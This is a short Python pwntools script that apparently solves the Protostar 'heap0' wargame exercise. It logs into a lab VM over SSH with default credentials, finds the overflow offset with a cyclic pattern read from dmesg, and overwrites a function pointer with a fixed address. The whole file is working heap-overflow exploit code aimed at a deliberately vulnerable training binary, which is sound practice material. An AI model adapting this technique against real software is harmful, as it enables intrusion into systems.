#!/usr/bin/env python3
from pwn import *
import re
context.update(arch='i386', os='linux')
context.bits =32

def execute_exploit(payload, showOuput=True):
    tmpFile = '/tmp/payload'
    exe = '/opt/protostar/bin/heap0'
    cmd = '$(cat {})'.format(tmpFile)

    s = ssh(host='192.168.12.128', user='user', password='user')
    s.upload_data(payload, tmpFile)
    sh = s.run('{} {}'.format(exe, cmd))
    if showOuput:
        print(sh.recvS())
    s.close()

def get_padding():
    context.log_level='error'
    execute_exploit(cyclic(100), False)
    s = ssh(host='192.168.12.128', user='user', password='user')
    cmd = 'dmesg | tail'
    sh = s.run(cmd)
    output = sh.recvS().split('\n')
    #print(output)
    for s in output[-2].split(): 
        if s.isdigit():
            segfaultVal = int(s, 16)
            break
    context.log_level='info'
    return cyclic_find(segfaultVal)

padding = get_padding()
payload = b'a'*padding + p32(0x08048464)
execute_exploit(payload)


